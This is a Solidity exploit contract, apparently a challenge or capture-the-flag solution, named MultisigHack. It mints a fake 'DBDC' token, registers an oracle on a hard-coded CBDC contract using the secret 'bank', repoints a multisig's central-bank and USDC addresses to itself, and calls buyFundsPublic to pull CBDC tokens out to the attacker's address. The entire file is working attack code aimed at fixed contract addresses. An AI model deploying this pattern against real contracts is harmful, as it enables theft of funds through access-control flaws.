//SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface CBDC is IERC20 {
    function addOracle(string calldata _secret) external;
}

interface MULTISIG {
    function updateCentralBank(address _newBank) external;
    function upgradeUSDC(address _usdc) external;
    function buyFundsPublic() external;
}

contract MultisigHack is ERC20 {
    CBDC public cbdc = CBDC(0x094251c982cb00B1b1E1707D61553E304289D4D8);
    MULTISIG public multisig = MULTISIG(0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA);

    address attacker;
    address msig = 0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA;

    constructor() ERC20("Decentral Bank Digital Currency", "DBDC") {
        _mint(address(this), 1000000000000000000 ether);
        attacker = msg.sender;
    }

    function hack() public {
        bytes32 _blockHash = blockhash(block.number - 1);

        cbdc.addOracle("bank");

        multisig.updateCentralBank(address(this));
        multisig.upgradeUSDC(address(this));
        
        _approve(address(this), msig, 10000000000000);

        multisig.buyFundsPublic();

        cbdc.transfer(attacker, 1);
    }
}